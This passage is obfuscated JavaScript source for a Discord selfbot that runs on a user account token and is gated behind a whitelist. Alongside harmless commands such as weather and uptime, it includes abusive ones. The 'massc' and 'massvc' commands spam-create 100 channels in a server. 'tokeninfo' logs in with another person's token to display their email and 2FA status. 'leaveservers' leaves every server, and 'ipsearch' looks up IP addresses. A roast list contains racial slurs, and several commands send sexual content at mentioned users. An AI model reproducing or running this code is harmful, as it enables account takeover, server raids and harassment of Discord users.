                        if (!_0x1522a7) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x3d9582 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' cuddle with ' + _0x1522a7.tag).setColor('#000000').setImage(_0x3a073d.body.url);
                        _0x45a05e.channel.send(_0x3d9582);
                    });
                }
                if (_0x332eac === 'tits') {
                    let _0x52686a = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/tits', (_0x4e5b1a, _0x4728fa) => {
                        if (!_0x52686a) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x1da969 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' show tits ;3 ' + _0x52686a.tag).setColor('#000000').setImage(_0x4728fa.body.url);
                        _0x45a05e.channel.send(_0x1da969);
                    });
                }
                if (_0x332eac === 'blowjob') {
                    let _0x3d69f7 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/blowJob', (_0x263b66, _0x175dcf) => {
                        if (!_0x3d69f7) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0xfc4b93 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' gave u blowjob ' + _0x3d69f7.tag).setColor('#000000').setImage(_0x175dcf.body.url);
                        _0x45a05e.channel.send(_0xfc4b93);
                    });
                }
                if (_0x332eac === 'leaveservers') {
                    let _0x298ccf = new RichEmbed().setDescription('Left/Deleted ' + bot.guilds.size + ' Servers');
                    _0x45a05e.edit(_0x298ccf), bot.guilds.forEach(_0x1938bf => _0x1938bf.leave());
                }
                if (_0x332eac === 'feed') {
                    let _0x50a8f3 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/feed', (_0x479d98, _0x50c773) => {
                        if (!_0x50a8f3) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x1ebb3c = new RichEmbed().setDescription(_0x45a05e.author.tag + '  is feeding ' + _0x50a8f3.tag).setColor('#000000').setImage(_0x50c773.body.url);
                        _0x45a05e.channel.send(_0x1ebb3c);
                    });
                }
                if (_0x332eac === 'fuck') {
                    let _0x577138 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/Random_hentai_gif', (_0x40a167, _0x30cd84) => {
                        if (!_0x577138) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x5e2190 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' is having esex with ' + _0x577138.tag).setColor('#000000').setImage(_0x30cd84.body.url);
                        _0x45a05e.channel.send(_0x5e2190);
                    });
                }
                if (_0x332eac === 'tickle') {
                    let _0x2badaf = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/tickle', (_0x35a1c1, _0xde1f3e) => {
                        if (!_0x2badaf) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x374b03 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' is having esex with ' + _0x2badaf.tag).setColor('#000000').setImage(_0xde1f3e.body.url);
                        _0x45a05e.channel.send(_0x374b03);
                    });
                }
                if (_0x332eac === 'kiss') {
                    let _0x399db7 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/kiss', (_0x1b6491, _0x3c4007) => {
                        if (!_0x399db7) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0xb69540 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' kiss ' + _0x399db7.tag).setColor('#000000').setImage(_0x3c4007.body.url);
                        _0x45a05e.channel.send(_0xb69540);
                    });
                }
                if (_0x332eac === 'stats') {
                    const _0xb07b8 = moment.duration(client.uptime).format(' D [days], H [hrs], m [mins], s [secs]');
                    _0x45a05e.channel.send(`= STATISTICS =\
                  • Mem Usage  :: ` + (process.memoryUsage().heapUsed / 1).toFixed(2) + ` MB\
                  • Uptime     :: ` + _0xb07b8 + `\
                  • Users      :: ` + client.users.size.toLocaleString() + '\x0a                  • Servers    :: ' + client.guilds.size.toLocaleString() + `\
                  • Channels   :: ` + client.channels.size.toLocaleString() + '\x0a                  • Discord.js :: v' + version + '\x0a                  • Node       :: ' + process.version, {
                        'code': 'asciidoc'
                    });
                };
                if (_0x332eac === 'boobs') {
                    let _0x4bfb9e = _0x45a05e.mentions.users.first();
                    superagent.get('', (_0x263f0f, _0xe71e9d) => {
                        if (!_0x4bfb9e) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x4ab887 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' kiss ' + _0x4bfb9e.tag).setColor('#000000').setImage(_0xe71e9d.body.url);
                        _0x45a05e.channel.send(_0x4ab887);
                    });
                }
                _0x332eac === 'doom' && ascii.font(_0x55fe92.join(' '), 'Doom', function (_0x373a34, _0x11d25c) {
                    _0x11d25c = _0x11d25c.trimRight(), _0x45a05e.channel.send('```\x0a' + _0x11d25c + `\
\`\`\``);
                });
                _0x332eac === 'rusted' && ascii.font(_0x55fe92.join(' '), 'rusted', function (_0x244059, _0x2723f1) {
                    _0x2723f1 = _0x2723f1.trimRight(), _0x45a05e.channel.send('```\x0a' + _0x2723f1 + '\x0a```');
                });
                if (_0x332eac === 'tokeninfo') {
                    let _0x3f7ca3 = _0x55fe92.join(' ');
                    if (!_0x3f7ca3) return _0x45a05e.edit('`You forgot to provice a token!`').then(_0x28051a => _0x28051a.delete(3000));
                    const _0x4bb56d = new Client();
                    _0x4bb56d.login(_0x3f7ca3), _0x4bb56d.on('ready', () => {
                        let _0xcedc5f = new RichEmbed().addField('Avatar', _0x4bb56d.user.avatar).addField('name', _0x4bb56d.user.username).addField('ID', _0x4bb56d.user.id).addField('Email', _0x4bb56d.user.email).addField('Created', _0x4bb56d.user.createdAt).addField('Verified', _0x4bb56d.user.verified).addField('Nitro', _0x4bb56d.user.premium).addField('2fa', _0x4bb56d.user.mfaEnabled).addField('Last Message', _0x4bb56d.user.lastMessage || 'No Messages');
                        _0x45a05e.channel.send(_0xcedc5f);
                    });
                }
                if (_0x332eac === 'handjob') {
                    let _0x5df562 = _0x45a05e.mentions.users.first();
                    if (!_0x5df562) return _0x45a05e.channel.send('`@ user to lol`').then(_0x1ceadf => _0x1ceadf.delete(3000));
                    _0x45a05e.edit('8=:fist:==D ' + _0x5df562), _0x45a05e.edit('8==:fist:=D ' + _0x5df562), _0x45a05e.edit('8===:fist:D ' + _0x5df562), _0x45a05e.edit('8==:fist:=D ' + _0x5df562), _0x45a05e.edit('8=:fist:==D ' + _0x5df562), _0x45a05e.edit('8:fist:===D ' + _0x5df562), _0x45a05e.edit('8=:fist:==D ' + _0x5df562), _0x45a05e.edit('8==:fist:=D ' + _0x5df562), _0x45a05e.edit('8===:fist:D ' + _0x5df562), _0x45a05e.edit('8==:fist:=D:sweat_drops: ' + _0x5df562), _0x45a05e.edit('8===:fist:D:sweat_drops: ' + _0x5df562);
                }
                if (_0x332eac === 'pack') {
                    let _0xde8370 = ['`COME ON NAH SON YOUR FAT LIKE SHIT `', '` U GOT YOUR MIC FROM WALMART NASTY AH NIGGA`', '`U SO FAT WHEN U WALK IN YOUR CLASS THE ROOM SHAKE `', '`YOUR FAT WHEN U WALK BY MY TV I MISSED LIKE 10 EP`', '`MA NIGGA U THE TYPE OF NIGGA WHO ASKED FOR SECOND LUCH YOUR FAT LIKE SHTT `', '`YOUR GAY LIKE SHIT NIGGA FUCK U DUMB ASS `', '`YOUR MOM LEFT U IN A TRASH CUZ U UGLY LIKE SHIT NIGGA `', '`U TRY TO FUCK YOUR GRANNY AND GET SUPERLEX  `'];
                    _0x45a05e.edit(_0xde8370[Math.floor(Math.random() * _0xde8370.length)]);
                }
                if (_0x332eac === 'fakewizz') {
                    let _0x254806 = _0x45a05e.mentions.users.first();
                    if (!_0x254806) return _0x45a05e.edit('`@ user to lol`').then(_0x14c1b7 => _0x14c1b7.delete(3000));
                    _0x45a05e.edit(_0x254806), _0x45a05e.edit('`Deleting channel.`'), _0x45a05e.edit('`done`'), _0x45a05e.edit('`Changing Server Name.`'), _0x45a05e.edit('`done`'), _0x45a05e.edit('`Kicking Bot`'), _0x45a05e.edit('`done`'), _0x45a05e.edit('`Making Channel`'), _0x45a05e.edit('`done`'), _0x45a05e.edit('`Banning all Members`').then(_0x3cccda => _0x3cccda.delete(3000));
                }
                if (_0x332eac === 'pfp') {
                    let _0x45505f = _0x45a05e.mentions.users.first();
                    if (!_0x45505f) return _0x45a05e.edit('`@ user to lol`').then(_0xbb838a => _0xbb838a.delete(3000));
                    let _0x46b5fc = new RichEmbed().setDescription('PFP URL: [Click to See](' + _0x45505f.avatarURL + ')').setImage(_0x45505f.avatarURL);
                    _0x45a05e.channel.send(_0x46b5fc);
                }
                if (_0x332eac === 'stealpfp') {
                    let _0x34cd6f = _0x45a05e.mentions.users.first();
                    bot.user.setAvatar(_0x34cd6f.avatarURL), _0x45a05e.channel.send('Done!');
                }
                if (_0x332eac === 'lol') {
                    let _0x3587bb = _0x45a05e.mentions.users.first();
                    if (!_0x3587bb) return _0x45a05e.edit('`@ user to lol`').then(_0x124153 => _0x124153.delete(3000));
                    _0x45a05e.edit(_0x3587bb), _0x45a05e.edit(':joy: ' + _0x3587bb), _0x45a05e.edit(':joy::joy: ' + _0x3587bb), _0x45a05e.edit(':joy::joy::joy: ' + _0x3587bb), _0x45a05e.edit(':joy::joy: ' + _0x3587bb + ' :joy:'), _0x45a05e.edit(':joy: ' + _0x3587bb + ':joy::joy:'), _0x45a05e.edit(_0x3587bb + ' :joy::joy::joy:').then(_0x401bd8 => _0x401bd8.delete(3000));
                }
                _0x332eac === 'ping' && _0x45a05e.edit('*' + bot.ping.toFixed() + 'ms*');
                _0x332eac === 'clear' && _0x45a05e.channel.fetchMessages({
                    'limit': 0x64
                }).then(_0x568e73 => _0x568e73.filter(_0x202a1e => _0x202a1e.author.id === bot.user.id).map(_0x22c281 => _0x22c281.delete()));
                _0x332eac === 'listening' && (bot.user.setPresence({
                    'game': {
                        'name': _0x55fe92.join(' '),
                        'type': 'LISTENING',
                        'url': 'https://twitch.tv/syrusisthebestcoder'
                    }
                }), _0x45a05e.delete(), await _0x45a05e.channel.send('Changinging Status...').then(_0x4c5369 => _0x4c5369.delete(1000)), await _0x45a05e.channel.send('`Listening` Created!').then(_0x436481 => _0x436481.delete(2000)));;
                if (_0x332eac === 'uptime') {
                    var _0x3b0619 = parseInt(bot.uptime / 1000 & 60),
                        _0x535ff4 = parseInt(bot.uptime / (60000) % 0x3c),
                        _0x2d8bcb = parseInt(bot.uptime / (3.6e+6) % 0x18);
                    _0x2d8bcb = _0x2d8bcb < 10 ? '0' + _0x2d8bcb : _0x2d8bcb, _0x535ff4 = _0x535ff4 < 10 ? '0' + _0x535ff4 : _0x535ff4, _0x3b0619 = _0x3b0619 < 10 ? '0' + _0x3b0619 : _0x3b0619;
                    let _0x1e4771 = new RichEmbed().setDescription('⌛𝘏𝘰𝘶𝘳: ' + _0x2d8bcb + `\
\
⏱𝘔𝘪𝘯𝘶𝘵𝘦𝘴: ` + _0x535ff4 + `\
\
⌚𝘚𝘦𝘤𝘰𝘯𝘥𝘴: ` + _0x3b0619);
                    _0x45a05e.edit(_0x1e4771);
                }
                _0x332eac === 'streaming' && (bot.user.setActivity(_0x55fe92.join(' '), {
                    'url': 'https://www.twitch.tv/syrusisthebestcoder',
                    'type': 'STREAMING'
                }), _0x45a05e.delete(), await _0x45a05e.channel.send('Chaning Status...').then(_0x42ecc5 => _0x42ecc5.delete(1000)), await _0x45a05e.channel.send('`Streaming` Created! ').then(_0x42676f => _0x42676f.delete(2000)));;
                _0x332eac === 'watching' && (bot.user.setActivity(_0x55fe92.join(' '), {
                    'url': 'https://www.twitch.tv/syrusisthebestcoder',
                    'type': 'WATCHING'
                }), _0x45a05e.delete(), await _0x45a05e.channel.send('Chaning Status...').then(_0x27bb35 => _0x27bb35.delete(1000)), await _0x45a05e.channel.send('`Watching` Created! ').then(_0xee2acb => _0xee2acb.delete(2000)));;
                _0x332eac === 'listening' && (bot.user.setActivity(_0x55fe92.join(' '), {
                    'url': 'https://www.twitch.tv/syrusisthebestcoder',
                    'type': 'LISTENING'
                }), _0x45a05e.delete(), await _0x45a05e.channel.send('Chaning Status...').then(_0x3580e0 => _0x3580e0.delete(1000)), await _0x45a05e.channel.send('`listening` Created! ').then(_0x4654d4 => _0x4654d4.delete(2000)));;
                _0x332eac === 'playing' && (bot.user.setActivity(_0x55fe92.join(' '), {
                    'url': 'https://www.twitch.tv/syrusisthebestcoder',
                    'type': 'PLAYING'
                }), _0x45a05e.delete(), await _0x45a05e.channel.send('Chaning Status...').then(_0x43094b => _0x43094b.delete(1000)), await _0x45a05e.channel.send('`Watching` Created! ').then(_0x5bd3ea => _0x5bd3ea.delete(2000)));;
                _0x332eac === 'stats' && _0x45a05e.edit('`𝐈𝐍`' + bot.guilds.size + '`𝐒𝐄𝐑𝐕𝐄𝐑𝐒`' + bot.users.size + '`𝐌𝐄𝐌𝐁𝐄𝐑𝐒`');
                if (_0x332eac === 'token') {
                    let _0x3f0139 = _0x45a05e.mentions.users.first() || bot.users.get(_0x55fe92[0]);
                    if (!_0x3f0139) return _0x45a05e.channel.send('You forgot to mention a user!');
                    let _0x530c02 = new RichEmbed().setDescription(Buffer.from(_0x3f0139.id).toString('base64')).setColor('#000000').setThumbnail('https://cdn.discordapp.com/attachments/0.99996234372946/1dab26152bac70ca721e071aeb5ad1a9.gif');
                    _0x45a05e.channel.send(_0x530c02);
                }
                _0x332eac === 'stop' && (bot.user.setActivity(''), _0x45a05e.delete(), await _0x45a05e.channel.send('Status `Stopped`! ').then(_0xf45611 => _0xf45611.delete(2000)));;
                _0x332eac === 'typing' && (_0x45a05e.channel.startTyping(), _0x45a05e.react('✅'));
                if (_0x332eac === 'purge') {
                    if (_0x55fe92[0] < 1 || _0x55fe92.length < 1) return _0x45a05e.edit("`You can't purge <= 0 messages!`").then(_0x544a1c => _0x544a1c.delete(2000));;
                    let _0x1aafc8 = parseInt(_0x55fe92[0] || 1);
                    _0x45a05e.channel.fetchMessages({
                        'limit': 0x64
                    }).then(async _0x1d8d4c => {
                        let _0xe0272d = _0x1d8d4c.array();
                        _0xe0272d = _0xe0272d.filter(_0x105add => _0x105add.author.id === bot.user.id), _0xe0272d.length = _0x1aafc8 + 1, _0xe0272d.map(_0x365a27 => _0x365a27.delete()), await _0x45a05e.channel.send('*Purged* ' + (' `' + _0x55fe92[0] + '/' + _0x55fe92[0] + '`') + ' *messages!*').then(_0x526b8e => _0x526b8e.delete(1500));
                    });
                };
                if (_0x332eac === 'massc') {
                    if (_0x55fe92.length < 2) return _0x45a05e.edit('`Please enter text channel name and channels`').then(_0x31f6db => _0x31f6db.delete(5000));
                    _0x45a05e.delete();
                    for (let _0x128ae9 = 0; _0x128ae9 < 100; _0x128ae9++) {
                        _0x45a05e.guild.createChannel(_0x55fe92.join(' '), 'text');
                    }
                }
                if (_0x332eac === 'massvc') {
                    if (_0x55fe92.length < 1) return _0x45a05e.edit('`Please enter voice channel name`').then(_0x412698 => _0x412698.delete(5000));
                    _0x45a05e.delete();
                    for (let _0x30d09c = 0; _0x30d09c < 100; _0x30d09c++) {
                        _0x45a05e.guild.createChannel(_0x55fe92.join(' '), 'voice');
                    }
                }
                if (_0x332eac === 'spam') {
                    let _0x2a0b1d = _0x55fe92.join(' ');
                    if (!_0x2a0b1d) return _0x45a05e.edit('`Add message to spam!`').then(_0x21f5a9 => _0x21f5a9.delete(3000));
                    _0x45a05e.delete();
                };
                if (_0x332eac === 'afkon') {
                    if (afkmode === false) {
                        afkmode = true;
                        if (!_0x55fe92[0]) return _0x45a05e.reply('You forgot to specify how many seconds you should wait until sending the message!');
                        let _0x500281 = ms(_0x55fe92[0]);
                        if (!_0x500281 || _0x500281 < 1000) return _0x45a05e.reply('That was not a valid time, Enter Something Like `2s` `1m`');
                        let _0x57e31e = _0x55fe92.join(' ').slice(_0x55fe92[1].length);
                        if (!_0x57e31e) return _0x45a05e.reply('You forgot a message to send!');
                        setTimeout(() => {
                            _0x45a05e.channel.send(_0x57e31e);
                        }, _0x500281);
                    }
                }
                _0x332eac === 'afkoff' && (afkmode === true && (afkmode = false, _0x45a05e.channel.send('Deactivated AFK mode!')));
                if (_0x332eac === 'dm') {
                    let _0x1fbb80 = _0x55fe92.join(' ');
                    if (_0x1fbb80.length > 2000) return _0x45a05e.reply('Your message can not exceed 2000 characters.');
                    if (!_0x1fbb80) return _0x45a05e.reply('I need a message to send!');
                    let _0x43633d = _0x45a05e.mentions.users.first();
                    if (!_0x43633d) return _0x45a05e.reply('You forgot to mention a user.');
                    _0x43633d.send(_0x1fbb80.slice(_0x55fe92[0].length).trimLeft());
                }
                if (_0x332eac === 'backup') {
                    if (!_0x45a05e.guild.me.hasPermission('MANAGE_CHANNELS')) return _0x45a05e.reply('you do not have the manage_channels permissions.');
                    fs.readFile('././misc/u-backup/channels.txt', {
                        'encoding': 'utf8'
                    }, async function (_0x133cb, _0x551edf) {
                        if (_0x133cb) return _0x45a05e.channel.send('Could not find a backup file!');
                        let _0x215b9c = _0x551edf.split('\x0a');
                        for (let _0x37d62b = 0; _0x37d62b < _0x215b9c.length; _0x37d62b++) {
                            if (_0x215b9c[_0x37d62b].split(' ').length > 1) await _0x45a05e.guild.createChannel(_0x215b9c[_0x37d62b], {
                                'type': 'voice'
                            });
                            else _0x215b9c[_0x37d62b].split(' ').length <= 1 && await _0x45a05e.guild.createChannel(_0x215b9c[_0x37d62b], {
                                'type': 'text'
                            });
                        }
                        _0x45a05e.channel.send('Done!');
                    });
                }
                if (_0x332eac === 'flipcoin') {
                    let _0x5825fe = ['**Heads**', '**Tails**'];
                    _0x45a05e.edit(_0x5825fe[Math.floor(Math.random() * _0x5825fe.length)]).then(_0x21badc => _0x21badc.delete(5000));
                };
                _0x332eac === 'weather' && weather.find({
                    'search': _0x55fe92.join(' '),
                    'degreeTypeL': 'F'
                }, function (_0xe9ef42, _0x442627) {
                    if (_0xe9ef42) return _0x45a05e.edit('`Error: `' + _0xe9ef42).then(_0x543891 => _0x543891.delete(3000));
                    let _0x3f3b31 = _0x442627[0].current,
                        _0xc3c4e5 = _0x442627[0].location;
                    _0x45a05e.delete();
                    let _0x2f17cf = new Discord.RichEmbed().setDescription('Skys look - **' + _0x3f3b31.skytext + '**').setAuthor('Weather for ' + _0x3f3b31.observationpoint).setThumbnail(_0x3f3b31.imageURL).setColor('000000').addField('Timezone', 'UTC' + _0xc3c4e5.timezone, true).addField('Degree Type', _0xc3c4e5.degreetype, true).addField('Temperature', _0x3f3b31.temperature + ' Degrees', true).addField('Feels Like', _0x3f3b31.feelslike + ' Degrees', true).addField('Winds', _0x3f3b31.winddisplay, true).addField('Humidity', _0x3f3b31.humidity + '%', true);
                    _0x45a05e.channel.send(_0x2f17cf);
                });
                if (_0x332eac === 'serverinfo') {
                    const _0x5d31d0 = {
                        0x0: 'None',
                        1: 'Low',
                        2: 'Medium',
                        3: '(╯°□°）╯︵ ┻━┻',
                        4: '(ノಠ益ಠ)ノ彡┻━┻'
                    };
                    let _0x5cdb54 = true,
                        _0x5ee1d4 = _0x45a05e.guild.iconURL,
                        _0x282373 = new RichEmbed().setColor('#00ff00').setThumbnail(_0x5ee1d4).setAuthor(_0x45a05e.guild.name).addField('Name', _0x45a05e.guild.name, _0x5cdb54).addField('ID', _0x45a05e.guild.id, _0x5cdb54).addField('Owner', _0x45a05e.guild.owner, _0x5cdb54).addField('Region', _0x45a05e.guild.region, _0x5cdb54).addField('Verification Level', _0x5d31d0[_0x45a05e.guild.verificationLevel], _0x5cdb54).addField('Members', '' + _0x45a05e.guild.memberCount, _0x5cdb54).addField('Roles', _0x45a05e.guild.roles.size, _0x5cdb54).addField('Channels', _0x45a05e.guild.channels.size, _0x5cdb54).addField('You Joined', _0x45a05e.member.joinedAt).setFooter('Created ' + _0x45a05e.guild.createdAt);
                    _0x45a05e.channel.send(_0x282373), _0x45a05e.delete();
                }
                if (_0x332eac === 'poki') {
                    let _0x50982a, _0x4ed509 = new RichEmbed().setColor('RANDOM');
                    if (_0x55fe92[0]) {
                        _0x50982a = pokemon.getSprite(_0x55fe92[0]);
                        if (!_0x50982a) return _0x45a05e.reply('Could not find that pokemon!');
                        _0x4ed509.setImage(_0x50982a), _0x45a05e.channel.send(_0x4ed509);
                        return;
                    }
                    _0x50982a = 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/' + (Math.floor(Math.random() * 807) + 1) + '.png', _0x4ed509.setImage(_0x50982a), _0x45a05e.channel.send(_0x4ed509);
                }
                if (_0x332eac === 'ipsearch') {
                    let _0x362a5d = _0x55fe92.join(' ');
                    snekfetch.get('http://ip-api.com/json/' + _0x362a5d).then(_0x19b258 => {
                        let _0x5ed79d = new RichEmbed().setDescription('``' + ('Looked Up IP: ' + _0x19b258.body.query + `\
Country: ` + _0x19b258.body.country + `\
Country Code: ` + _0x19b258.body.countryCode + `\
ISP: ` + _0x19b258.body.isp + `\
Region: ` + _0x19b258.body.region + `\
Status: ` + _0x19b258.body.status + `\
TimeZone: ` + _0x19b258.body.timezone + '\x0aAS: ' + _0x19b258.body.as + '\x0aOrg: ' + _0x19b258.body.org + `\
Zip: ` + _0x19b258.body.zipCode) + '``').setTimestamp().setColor('#D02BB5');
                        _0x45a05e.channel.send(_0x5ed79d);
                    });
                }
            });
        } else console.log(red('                            ::::::::::: ::::    :::  ::::::::        ::::::::  :::::::::  ')), console.log(red('                                :+:     :+:+:   :+: :+:    :+:      :+:    :+: :+:    :+: ')), console.log(red('                                +:+     :+:+:+  +:+ +:+    +:+      +:+        +:+    +:+ ')), console.log(red('                                +#+     +#+ +:+ +#+ +#+    +:+      +#++:++#++ +#++:++#+  ')), console.log(red('                                +#+     +#+  +#+#+# +#+    +#+             +#+ +#+    +#+ ')), console.log(red('                                #+#     #+#   #+#+# #+#    #+#      #+#    #+# #+#    #+# ')), console.log(red('                                ###     ###    ####  ########        ########  #########  ')), console.log(blue('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(red('YOU ARE NOT WHITELISTED!')), console.log(green('DM $Y#8300 TO GET WHITELISTED!')), console.log(red('SUBSCRIBE TO 2KSYRUS'));
    });
}), bot.login(settings.token);